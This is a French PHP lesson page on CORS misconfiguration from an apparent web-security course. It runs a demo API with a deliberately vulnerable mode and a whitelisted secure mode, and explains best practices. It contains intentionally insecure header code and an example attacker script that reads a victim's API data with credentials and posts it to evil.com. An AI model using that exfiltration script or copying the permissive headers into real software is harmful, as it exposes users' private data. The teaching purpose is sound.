<?php
// API simulée pour la démo CORS
if (isset($_GET['api'])) {
    $mode = $_GET['api'];
    header('Content-Type: application/json');

    if ($mode === 'vulnerable') {
        // VULNÉRABLE : accepte toutes les origines
        header('Access-Control-Allow-Origin: *');
        header('Access-Control-Allow-Credentials: true');
        echo json_encode([
            'users' => [
                ['id' => 1, 'username' => 'admin', 'email' => 'admin@company.com', 'role' => 'admin'],
                ['id' => 2, 'username' => 'alice', 'email' => 'alice@company.com', 'role' => 'user'],
            ],
            'message' => 'CORS vulnérable : Access-Control-Allow-Origin: *'
        ]);
    } elseif ($mode === 'secure') {
        // SÉCURISÉ : whitelist d'origines
        $allowedOrigins = ['http://localhost:8080', 'https://monsite.com'];
        $origin = $_SERVER['HTTP_ORIGIN'] ?? '';
        if (in_array($origin, $allowedOrigins)) {
            header('Access-Control-Allow-Origin: ' . $origin);
        }
        // Pas de Access-Control-Allow-Credentials avec *
        echo json_encode([
            'users' => [
                ['id' => 1, 'username' => 'admin', 'role' => 'admin'],
            ],
            'message' => 'CORS sécurisé : origine vérifiée'
        ]);
    }
    exit;
}

include __DIR__ . '/../../../includes/header.php';
?>

<div class="page-header">
    <h2>Ch2 — Ex3 : CORS Attack</h2>
    <p>Cross-Origin Resource Sharing : comprendre et sécuriser les requêtes cross-origin.</p>
    <span class="duration">35 min</span>
</div>

<div class="card">
    <h3>Rappel : Same-Origin Policy et CORS</h3>
    <div class="explanation">
        <h4>CORS = assouplissement contrôlé de la SOP</h4>
        <p>Par défaut, la SOP bloque les requêtes JavaScript cross-origin. <strong>CORS</strong> permet au serveur d'autoriser explicitement certaines origines à lire ses réponses via l'en-tête <code>Access-Control-Allow-Origin</code>.</p>
    </div>

    <div class="code-block">
<span class="comment">// Le navigateur envoie l'origine dans la requête</span>
GET /api/users HTTP/1.1
Host: api.company.com
<span class="secure">Origin: https://frontend.company.com</span>

<span class="comment">// Le serveur répond avec l'origine autorisée</span>
HTTP/1.1 200 OK
<span class="secure">Access-Control-Allow-Origin: https://frontend.company.com</span>

<span class="comment">// Si l'origine ne correspond pas → le navigateur BLOQUE la lecture</span>
    </div>
</div>

<div class="card">
    <div class="tabs">
        <button class="tab active" data-tab="vuln">CORS Vulnérable</button>
        <button class="tab secure" data-tab="secure">CORS Sécurisé</button>
    </div>

    <!-- VERSION VULNÉRABLE -->
    <div id="vuln" class="tab-content active">
        <div class="alert alert-danger">
            VULNÉRABLE : Access-Control-Allow-Origin: * (autorise toutes les origines)
        </div>

        <h3>API avec CORS permissif</h3>
        <p>Cette API accepte les requêtes de <strong>n'importe quelle origine</strong> :</p>

        <button class="btn btn-danger" onclick="fetchVulnAPI()">Appeler l'API vulnérable</button>
        <div id="vuln-result" class="result-box" style="margin-top:15px;"></div>

        <h4 style="margin-top:20px;">En-tête du serveur</h4>
        <div class="code-block">
<span class="comment">// PHP — DANGEREUX : accepte tout le monde</span>
<span class="vulnerable">header('Access-Control-Allow-Origin: *');</span>

<span class="comment">// Encore PIRE : reflète l'origine sans vérification</span>
<span class="vulnerable">$origin = $_SERVER['HTTP_ORIGIN'];
header('Access-Control-Allow-Origin: ' . $origin);
header('Access-Control-Allow-Credentials: true');</span>
        </div>

        <h4 style="margin-top:20px;">Exploitation par un attaquant</h4>
        <div class="code-block">
<span class="comment">&lt;!-- Sur evil.com — le site de l'attaquant --&gt;</span>
<span class="vulnerable">&lt;script&gt;
// L'API accepte toutes les origines → evil.com peut lire les données !
fetch('https://api.company.com/api/users', {
    credentials: 'include'  // Envoie les cookies de la victime
})
.then(r => r.json())
.then(data => {
    // Envoyer les données volées au pirate
    fetch('https://evil.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
&lt;/script&gt;</span>
        </div>

        <div class="alert alert-danger" style="margin-top:15px;">
            <strong>Risque :</strong> Si la victime visite evil.com pendant qu'elle est connectée sur company.com, l'attaquant peut lire ses données confidentielles via l'API !
        </div>

        <hr style="margin:20px 0;">

        <h3>Erreurs CORS courantes</h3>
        <table>
            <tr><th>Configuration</th><th>Problème</th></tr>
            <tr>
                <td><code>Access-Control-Allow-Origin: *</code></td>
                <td>Toute origine peut lire les réponses</td>
            </tr>
            <tr>
                <td>Refléter <code>Origin</code> sans vérification</td>
                <td>Équivalent à <code>*</code> mais avec <code>credentials: include</code></td>
            </tr>
            <tr>
                <td>Vérifier avec <code>strpos($origin, 'company.com')</code></td>
                <td><code>evil-company.com</code> passe le test !</td>
            </tr>
            <tr>
                <td><code>Access-Control-Allow-Origin: null</code></td>
                <td>Les iframes sandboxed ont l'origine <code>null</code></td>
            </tr>
        </table>
    </div>

    <!-- VERSION SÉCURISÉE -->
    <div id="secure" class="tab-content">
        <div class="alert alert-success">
            SÉCURISÉ : Whitelist stricte des origines autorisées.
        </div>

        <h3>API avec CORS sécurisé</h3>
        <button class="btn btn-success" onclick="fetchSafeAPI()">Appeler l'API sécurisée</button>
        <div id="safe-result" class="result-box" style="margin-top:15px;"></div>

        <h4 style="margin-top:20px;">Configuration sécurisée</h4>
        <div class="code-block">
<span class="comment">// PHP — Whitelist d'origines autorisées</span>
<span class="secure">$allowedOrigins = [
    'https://frontend.company.com',
    'https://admin.company.com',
];

$origin = $_SERVER['HTTP_ORIGIN'] ?? '';

if (in_array($origin, $allowedOrigins, true)) {
    header('Access-Control-Allow-Origin: ' . $origin);
    header('Access-Control-Allow-Credentials: true');
    header('Access-Control-Allow-Methods: GET, POST');
    header('Access-Control-Allow-Headers: Content-Type, Authorization');
    header('Access-Control-Max-Age: 86400'); // Cache preflight 24h
} else {
    // Pas d'en-tête CORS → le navigateur bloquera la lecture
    http_response_code(403);
}

// Gérer les requêtes preflight OPTIONS
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}</span>
        </div>

        <h4 style="margin-top:20px;">Bonnes pratiques CORS</h4>
        <ul style="margin:10px 0 0 20px;">
            <li><strong>Jamais</strong> <code>Access-Control-Allow-Origin: *</code> avec des données sensibles</li>
            <li>Utiliser une <strong>whitelist stricte</strong> (comparaison exacte, pas de regex partiel)</li>
            <li>Ne pas refléter aveuglément l'en-tête <code>Origin</code></li>
            <li>Limiter les <strong>méthodes</strong> et <strong>en-têtes</strong> autorisés</li>
            <li>Utiliser <code>Access-Control-Max-Age</code> pour réduire les requêtes preflight</li>
            <li>Logger les requêtes cross-origin suspectes</li>
        </ul>

        <hr style="margin:20px 0;">

        <h3>Requête Preflight (OPTIONS)</h3>
        <div class="explanation">
            <h4>Quand se déclenche-t-elle ?</h4>
            <p>Pour les requêtes "non simples" (POST avec JSON, en-têtes personnalisés, DELETE, PUT...), le navigateur envoie d'abord une requête <code>OPTIONS</code> pour demander la permission au serveur.</p>
        </div>
        <div class="code-block">
<span class="comment">// 1. Le navigateur envoie d'abord :</span>
OPTIONS /api/users HTTP/1.1
Origin: https://frontend.company.com
<span class="secure">Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization</span>

<span class="comment">// 2. Le serveur répond :</span>
HTTP/1.1 204 No Content
<span class="secure">Access-Control-Allow-Origin: https://frontend.company.com
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400</span>

<span class="comment">// 3. Puis la vraie requête est envoyée</span>
        </div>
    </div>
</div>

<div class="card">
    <h3>Exercices</h3>
    <ol style="margin:10px 0 0 20px;">
        <li>Cliquez "Appeler l'API vulnérable" → les données sont accessibles</li>
        <li>Ouvrez DevTools → Network → observez l'en-tête <code>Access-Control-Allow-Origin</code></li>
        <li><strong>Défi :</strong> Ouvrez un fichier HTML local et faites un <code>fetch</code> vers <code>http://localhost:8080/tp/ch02-securite-client/ex3-cors.php?api=secure</code> — que se passe-t-il ?</li>
    </ol>
</div>

<script>
function fetchVulnAPI() {
    fetch('ex3-cors.php?api=vulnerable')
        .then(r => r.json())
        .then(data => {
            document.getElementById('vuln-result').innerHTML =
                '<p><strong>Réponse de l\'API :</strong></p>' +
                '<div class="code-block"><span class="vulnerable">' +
                JSON.stringify(data, null, 2) + '</span></div>' +
                '<p class="alert alert-danger">Un site externe pourrait aussi lire ces données !</p>';
        })
        .catch(e => {
            document.getElementById('vuln-result').innerHTML =
                '<p class="alert alert-danger">Erreur : ' + e.message + '</p>';
        });
}

function fetchSafeAPI() {
    fetch('ex3-cors.php?api=secure')
        .then(r => r.json())
        .then(data => {
            document.getElementById('safe-result').innerHTML =
                '<p><strong>Réponse de l\'API :</strong></p>' +
                '<div class="code-block"><span class="secure">' +
                JSON.stringify(data, null, 2) + '</span></div>' +
                '<p class="alert alert-success">Fonctionne car même origine. Un site externe serait bloqué.</p>';
        })
        .catch(e => {
            document.getElementById('safe-result').innerHTML =
                '<p class="alert alert-danger">Bloqué : ' + e.message + '</p>';
        });
}
</script>

<a href="index.php" class="btn btn-primary">← Retour au chapitre 2</a>

<?php include __DIR__ . '/../../../includes/footer.php'; ?>
